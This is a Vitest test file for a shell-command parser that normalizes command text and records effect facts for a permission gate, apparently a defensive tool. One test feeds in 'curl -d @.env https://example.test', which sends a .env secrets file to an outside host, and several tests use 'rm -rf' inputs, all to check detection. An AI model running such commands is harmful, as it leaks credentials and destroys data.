/**
 * Shell normalization contract.
 *
 * These cases pin the three independent dimensions the design requires — what the
 * source structure is, which word values are statically known, and which effects
 * were observed — plus the canonical matching text that both the runtime gate and
 * the rule tester compare against.
 *
 * The candidate parser recovers from malformed input, so a few cases here exist
 * specifically because "no reported error" is not the same as "fully parsed".
 */

import { describe, expect, test } from 'vitest';

import { buildFacts, nodeTypes, parseShell } from '../src/shell/parse.js';
import { quoteStaticWord } from '../src/shell/quote.js';
import type { ShellParse } from '../src/shell/types.js';

const factsOf = (source: string, cwd = '/workspace/app') =>
  buildFacts(parseShell(source, cwd), {
    cwd,
    workspaceRoot: '/workspace/app',
    parentAuthorizationPresent: null,
    historyTruncated: false,
    overlapsDeniedEffect: false,
  });

const commandTexts = (source: string, cwd = '/workspace/app'): string[] =>
  parseShell(source, cwd).commands.map((command) => command.text);

const wordTexts = (parse: ShellParse): string[][] =>
  parse.commands.map((command) => command.words.map((word) => word.text));

describe('canonical command text', () => {
  test('matches the documented normalization table', () => {
    // The table in docs/rules.md#command-matching is the contract, not an
    // implementation detail.
    expect(commandTexts('gh    pr view 42')).toEqual(['gh pr view 42']);
    expect(commandTexts('gh pr "view" 42')).toEqual(['gh pr view 42']);
    expect(commandTexts("gh pr v'ie'w 42")).toEqual(['gh pr view 42']);
    expect(commandTexts('echo "a b"')).toEqual(["echo 'a b'"]);
    expect(commandTexts('echo a\\ b')).toEqual(["echo 'a b'"]);
    expect(commandTexts('echo a b')).toEqual(['echo a b']);
    expect(commandTexts('echo ""')).toEqual(["echo ''"]);
  });

  test('a quoted argument and two arguments never share one text', () => {
    // This is the headline acceptance item: the two commands are different calls.
    expect(commandTexts('echo "a b"')).not.toEqual(commandTexts('echo a b'));
    expect(commandTexts('echo "a b"')).toEqual(["echo 'a b'"]);
    expect(commandTexts('echo a b')).toEqual(['echo a b']);
  });

  test('empty arguments stay visible and distinct from absent arguments', () => {
    expect(commandTexts('echo "" x')).toEqual(["echo '' x"]);
    expect(commandTexts('echo "" ""')).toEqual(["echo '' ''"]);
    expect(commandTexts("echo ''")).toEqual(["echo ''"]);
    // An empty word is one argument; dropping it would silently shorten the call.
    expect(parseShell('echo ""').commands[0]?.words).toHaveLength(2);
  });

  test('literal metacharacters are quoted, not re-interpreted', () => {
    expect(commandTexts('echo "a;b"')).toEqual(["echo 'a;b'"]);
    expect(commandTexts('echo "a|b"')).toEqual(["echo 'a|b'"]);
    expect(commandTexts("echo 'a b'")).toEqual(["echo 'a b'"]);
    // An embedded single quote uses the only escapable single-quote form.
    expect(quoteStaticWord("it's")).toBe("'it'\\''s'");
    expect(commandTexts('echo "it\'s"')).toEqual(["echo 'it'\\''s'"]);
  });

  test('concatenated quoting decodes to one word', () => {
    expect(commandTexts('echo \'a\'"b"c')).toEqual(['echo abc']);
    expect(commandTexts('echo "a"$\'b\'')).toEqual(['echo ab']);
    expect(wordTexts(parseShell('echo \'a\'"b"c'))).toEqual([['echo', 'abc']]);
  });

  test('ANSI-C quotes decode without being re-quoted literally', () => {
    expect(commandTexts("echo $'a\\tb'")).toEqual(["echo 'a\tb'"]);
    expect(commandTexts("echo $'a\\nb'")).toEqual(["echo 'a\nb'"]);
    expect(commandTexts("echo $'\\u4F60'")).toEqual(["echo '你'"]);
  });
});

describe('dynamic words keep their original expression', () => {
  test('quoting forms stay distinguishable', () => {
    // `'$HOME'` is a literal dollar; the other two are expansions, and none of the
    // three may collapse into a single text.
    const texts = [
      commandTexts("echo '$HOME'")[0],
      commandTexts('echo "$HOME"')[0],
      commandTexts('echo $HOME')[0],
    ];
    expect(new Set(texts).size).toBe(3);
    expect(texts[0]).toBe("echo '$HOME'");
    expect(texts[1]).toBe('echo "$HOME"');
    expect(texts[2]).toBe('echo $HOME');
    // The literal form is a static word; the others are dynamic.
    expect(parseShell("echo '$HOME'").commands[0]?.words[1]?.status).toBe(
      'static',
    );
    expect(parseShell('echo $HOME').commands[0]?.words[1]?.status).toBe(
      'dynamic',
    );
  });

  test('a quoted glob is not the same word as an unquoted glob', () => {
    expect(commandTexts("echo '*.ts'")).toEqual(["echo '*.ts'"]);
    expect(commandTexts('echo *.ts')).toEqual(['echo *.ts']);
    expect(parseShell("echo '*.ts'").commands[0]?.words[1]?.status).toBe(
      'static',
    );
    expect(parseShell('echo *.ts').commands[0]?.words[1]?.reasons).toEqual([
      'glob',
    ]);
  });

  test('each expansion kind is named and never executed', () => {
    const cases: readonly [string, string][] = [
      ['echo $X', 'variable'],
      ['echo ${X:-fallback}', 'variable'],
      ['echo $(date)', 'command-substitution'],
      ['echo `date`', 'command-substitution'],
      ['echo $((1+2))', 'arithmetic-expansion'],
      ['echo <(date)', 'process-substitution'],
      ['echo {a,b}', 'brace-expansion'],
      ['echo @(a|b)', 'extended-glob'],
      ['echo ~/x', 'tilde'],
      ['echo $"x"', 'locale-string'],
    ];
    for (const [source, reason] of cases) {
      const word = parseShell(source).commands[0]?.words[1];
      expect({ source, status: word?.status }).toEqual({
        source,
        status: 'dynamic',
      });
      expect(word?.reasons.includes(reason)).toBe(true);
      // The raw expression is preserved verbatim.
      expect({ source, raw: word?.raw }).toEqual({
        source,
        raw: source.slice(5),
      });
    }
    // Nothing was executed: the substitution keeps its expression, and the
    // command it would run is a separate subject that also has to be covered.
    expect(commandTexts('echo $(date)')).toEqual(['echo $(date)', 'date']);
  });

  test('a dynamic word does not make the structure unknown', () => {
    const parse = parseShell('gpt-relay send "$CONTENT"');
    expect(parse.completeness).toBe('complete');
    expect(parse.commands[0]?.text).toBe('gpt-relay send "$CONTENT"');
    expect(parse.structure.issues).toEqual([]);
  });

  test('an escaped dollar is a literal, not an expansion', () => {
    expect(commandTexts('echo \\$HOME')).toEqual(["echo '$HOME'"]);
    expect(parseShell('echo \\$HOME').unresolved).toEqual([]);
    expect(parseShell('echo \\$HOME').commands[0]?.words[1]?.status).toBe(
      'static',
    );
  });
});

describe('byte and character boundaries', () => {
  test('a NUL byte is never turned into a static value', () => {
    const parse = parseShell("echo $'\\x00'");
    const word = parse.commands[0]?.words[1];
    expect(word?.status).toBe('dynamic');
    expect(word?.reasons).toEqual(['nul-byte']);
    expect(word?.text).toBe("$'\\x00'");
  });

  test('an undecodable byte keeps its raw expression', () => {
    // The decoder replaces invalid UTF-8 with U+FFFD, which is lossy evidence.
    const parse = parseShell("echo $'\\xFF'");
    const word = parse.commands[0]?.words[1];
    expect(word?.status).toBe('dynamic');
    expect(word?.reasons).toEqual(['lossy-byte']);
    expect(word?.text).toBe("$'\\xFF'");
  });

  test('multibyte text, CRLF and a lone dollar stay intact', () => {
    expect(commandTexts('echo 你好')).toEqual(["echo '你好'"]);
    expect(commandTexts('echo a\r\necho b')).toEqual(["echo 'a\r'", 'echo b']);
    // A lone `$` is literal text, so it is quoted like any other static word.
    expect(commandTexts('echo $')).toEqual(["echo '$'"]);
    expect(commandTexts('echo a$')).toEqual(["echo 'a$'"]);
    expect(parseShell('echo $').unresolved).toEqual([]);
  });

  test('a trailing backslash is preserved rather than dropped', () => {
    const word = parseShell('echo a\\').commands[0]?.words[1];
    expect(word?.raw).toBe('a\\');
    // Bash keeps a trailing backslash and then continues the line, so the word is
    // a literal `a\` and is quoted like any other static value.
    expect(word?.text).toBe("'a\\'");
    expect(word?.status).toBe('static');
  });
});

describe('redirects, assignments and cwd', () => {
  test('a file redirect is a path subject resolved against the cwd', () => {
    const parse = parseShell('echo hi > out.txt', '/workspace/app');
    expect(parse.redirects).toHaveLength(1);
    expect(parse.redirects[0]).toMatchObject({
      op: '>',
      target: 'out.txt',
      unresolved: false,
      cwd: '/workspace/app',
      kind: 'file',
    });
  });

  test('descriptor duplication is not a path', () => {
    for (const source of ['echo hi 2>&1', 'exec 3>&1', 'echo hi >&-']) {
      const parse = parseShell(source);
      expect({ source, redirects: parse.redirects }).toEqual({
        source,
        redirects: [],
      });
      expect({ source, writes: factsOf(source).facts.observed.writes }).toEqual(
        {
          source,
          writes: [],
        },
      );
    }
  });

  test('here-documents and here-strings are data, not paths', () => {
    const heredoc = parseShell('cat <<EOF > out.txt\nhi\nEOF\n');
    expect(heredoc.redirects.map((redirect) => redirect.target)).toEqual([
      'out.txt',
    ]);
    expect(heredoc.heredocs).toBe(1);
    const hereString = parseShell('cat <<< "hi"');
    expect(hereString.redirects).toEqual([]);
    expect(factsOf('cat <<< "hi"').facts.observed.writes).toEqual([]);
  });

  test('an unquoted heredoc body expands; a quoted one does not', () => {
    const expanded = parseShell('cat <<EOF\n$X\nEOF\n');
    expect(expanded.unresolved).toContain('$X');
    const literal = parseShell("cat <<'EOF'\n$X\nEOF\n");
    expect(literal.unresolved).toEqual([]);
  });

  test('a dynamic redirect target is unresolved', () => {
    const parse = parseShell('echo hi > $TARGET');
    expect(parse.redirects[0]?.unresolved).toBe(true);
    expect(parse.redirects[0]?.target).toBe('$TARGET');
    // No guessed path: the raw expression is reported as the write target.
    expect(factsOf('echo hi > $TARGET').facts.observed.writes).toEqual([
      '$TARGET',
    ]);
  });

  test('assignments keep name and value', () => {
    const parse = parseShell('FOO=bar env');
    expect(parse.assignments[0]).toMatchObject({
      name: 'FOO',
      value: 'bar',
      dynamic: false,
    });
    expect(parse.commands[0]?.text).toBe('env');
    const dynamic = parseShell('FOO="$X" env');
    expect(dynamic.assignments[0]).toMatchObject({
      name: 'FOO',
      value: '"$X"',
      dynamic: true,
    });
  });

  test('cd moves the directory for later relative targets', () => {
    const parse = parseShell('cd /tmp && rm -rf build', '/workspace/app');
    expect(parse.commands.map((command) => command.cwd)).toEqual([
      '/workspace/app',
      '/tmp',
    ]);
    expect(factsOf('cd /tmp && rm -rf build').facts.observed.writes).toEqual([
      '/tmp/build',
    ]);
  });

  test('an unresolvable cd leaves the directory unknown', () => {
    for (const source of [
      'cd "$TARGET" && echo hi > out.txt',
      'cd ~ && echo hi > out.txt',
      'cd - && echo hi > out.txt',
    ]) {
      const parse = parseShell(source, '/workspace/app');
      const redirect = parse.redirects[0];
      expect({ source, cwd: redirect?.cwd }).toEqual({ source, cwd: null });
      expect({ source, unresolved: redirect?.unresolved }).toEqual({
        source,
        unresolved: true,
      });
    }
    // The known form still resolves.
    expect(
      parseShell('cd .. && echo hi > out.txt', '/workspace/app').redirects[0]
        ?.cwd,
    ).toBe('/workspace');
  });

  test('a cd inside a pipeline or subshell does not move the caller', () => {
    expect(
      parseShell('cd /tmp | cat && echo hi > out.txt', '/workspace/app')
        .redirects[0]?.cwd,
    ).toBe('/workspace/app');
    expect(
      parseShell('(cd /tmp) && echo hi > out.txt', '/workspace/app')
        .redirects[0]?.cwd,
    ).toBe('/workspace/app');
  });
});

describe('nested and compound structure', () => {
  test('nested commands become their own subjects', () => {
    expect(commandTexts('echo $(rm -rf build)')).toEqual([
      'echo $(rm -rf build)',
      'rm -rf build',
    ]);
    expect(commandTexts('echo a && echo b')).toEqual(['echo a', 'echo b']);
    expect(commandTexts('echo a | cat')).toEqual(['echo a', 'cat']);
    expect(commandTexts('(echo hi)')).toEqual(['echo hi']);
    expect(commandTexts('if true; then echo a; fi')).toEqual([
      'true',
      'echo a',
    ]);
  });

  test('executable descendants cannot vanish from the walk', () => {
    // Each of these hides a command inside a word part or a lazy operand; a
    // generic property walk could miss them without any parser error.
    const cases: readonly (readonly [string, string])[] = [
      ['echo ${a[$(touch /tmp/marker)]}', 'touch /tmp/marker'],
      ['echo ${x:-$(rm y)}', 'rm y'],
      ['echo $((1+$(rm y)))', 'rm y'],
      ['cat <<EOF\n$(rm y)\nEOF\n', 'rm y'],
      // A bare array assignment is not a command, so its expansion's command is
      // the only subject — which is exactly the point: it cannot disappear.
      ['x=($(rm y))', 'rm y'],
    ];
    for (const [source, inner] of cases) {
      const parse = parseShell(source);
      const texts = parse.commands.map((command) => command.text);
      expect(texts.includes(inner)).toBe(true);
      expect({ source, completeness: parse.completeness }).toEqual({
        source,
        completeness: 'complete',
      });
    }
    expect(commandTexts('echo ${x:-$(rm y)}')).toEqual([
      'echo ${x:-$(rm y)}',
      'rm y',
    ]);
    expect(commandTexts('x=($(rm y))')).toEqual(['rm y']);
  });

  test('a function body is part of the call', () => {
    expect(commandTexts('f() { echo hi; }')).toEqual(['echo hi']);
    expect(commandTexts('f() { rm -rf x; }')).toContain('rm -rf x');
  });

  test('a compound redirect stays attached to the call', () => {
    const parse = parseShell('if true; then echo a; fi > out.txt');
    expect(parse.redirects.map((redirect) => redirect.target)).toEqual([
      'out.txt',
    ]);
  });

  test('an unaccounted construct makes the structure incomplete', () => {
    // The candidate parser reports no error here: the `(` simply disappears.
    const parse = parseShell('echo (');
    expect(parse.completeness).toBe('partial');
    expect(parse.structure.issues).toEqual([
      expect.objectContaining({ kind: 'unparsed-source' }),
    ]);
  });

  test('a reported parse error is a structural issue at any depth', () => {
    const top = parseShell("echo 'unterminated");
    expect(top.completeness).toBe('partial');
    expect(top.structure.errors).toContain('unterminated single quote');
    const nested = parseShell('echo $(echo a;;');
    expect(nested.completeness).toBe('partial');
    expect(nested.structure.errors.length).toBeGreaterThan(0);
  });

  test('nesting the parser refuses is reported, not smoothed over', () => {
    // The candidate caps syntax nesting; an over-deep command must not come back
    // looking like a clean single command.
    const source = `${'('.repeat(300)}echo hi${')'.repeat(300)}`;
    const parse = parseShell(source);
    expect(parse.structure.issues.length).toBeGreaterThan(0);
    expect(parse.completeness).not.toBe('complete');
  });

  test('an empty or comment-only command is complete with no nodes', () => {
    for (const source of ['', '   ', '# only a comment', '#!/bin/sh']) {
      const parse = parseShell(source);
      expect({
        source,
        completeness: parse.completeness,
        commands: parse.commands,
        issues: parse.structure.issues,
      }).toEqual({
        source,
        completeness: 'complete',
        commands: [],
        issues: [],
      });
    }
  });

  test('node types describe what was actually extracted', () => {
    expect(nodeTypes(parseShell('echo hi > out.txt'))).toEqual([
      'command',
      'file_redirect',
    ]);
    expect(nodeTypes(parseShell('FOO=1 echo hi'))).toEqual([
      'command',
      'variable_assignment',
    ]);
    expect(nodeTypes(parseShell('echo $(date)'))).toEqual([
      'command',
      'command_substitution',
    ]);
  });
});

describe('effect facts', () => {
  test('reliable observations survive an incomplete structure', () => {
    const result = factsOf('curl -d @.env https://example.test; echo (');
    expect(result.facts.observed.networkCommands).toEqual(['curl']);
    expect(result.facts.observed.credentialPaths).toContain('@.env');
    // The structure gap still lowers fact completeness rather than being hidden.
    expect(result.facts.completeness).toBe('partial');
  });

  test('a decoded path is used for classification, not the matching text', () => {
    const quoted = factsOf('touch "/tmp/a b"');
    expect(quoted.facts.observed.writes).toEqual(['/tmp/a b']);
    expect(quoted.writesOutsideWorkspace).toEqual(['/tmp/a b']);
    const escaped = factsOf('touch /tmp/a\\ b');
    expect(escaped.facts.observed.writes).toEqual(['/tmp/a b']);
  });

  test('a static path containing a dollar is a literal path', () => {
    const result = factsOf("touch '/tmp/$X'");
    expect(result.facts.observed.writes).toEqual(['/tmp/$X']);
    expect(result.facts.expansionRisk).toBeNull();
  });

  test('an opaque interpreter is a fact, not a structural gap', () => {
    const result = factsOf('bash deploy.sh');
    expect(result.facts.opaque).toBe(true);
    expect(result.facts.completeness).toBe('partial');
    expect(result.facts.observed.writes).toEqual([]);
  });

  test('every capped category downgrades fact completeness', () => {
    const manyWrites = Array.from(
      { length: 40 },
      (_, index) => `touch ./out-${String(index)}`,
    ).join('\n');
    expect(factsOf(manyWrites).facts.truncated).toBe(true);
    expect(factsOf(manyWrites).facts.completeness).toBe('partial');

    // Credential paths and network commands cap the same way; their truncation is
    // reported through completeness because the shared shape only flags writes.
    const manyCredentials = Array.from(
      { length: 40 },
      (_, index) => `echo @.env/${String(index)}`,
    ).join('\n');
    const credentials = factsOf(manyCredentials);
    expect(credentials.facts.observed.credentialPaths).toHaveLength(30);
    expect(credentials.facts.completeness).toBe('partial');
  });
});

describe('performance samples', () => {
  test('a large word and many commands stay within the parse budget', () => {
    const largeWord = `echo ${'a'.repeat(100_000)}`;
    const manyCommands = Array.from(
      { length: 2_000 },
      (_, index) => `echo cmd${String(index)} > out${String(index)}.txt`,
    ).join('\n');
    for (const source of [largeWord, manyCommands]) {
      const start = performance.now();
      const parse = parseShell(source, '/workspace/app');
      const elapsed = performance.now() - start;
      expect(`${String(source.length)} chars: ${String(elapsed < 5_000)}`).toBe(
        `${String(source.length)} chars: true`,
      );
      expect(parse.completeness).toBe('complete');
    }
    expect(parseShell(manyCommands).commands).toHaveLength(2_000);
  });
});
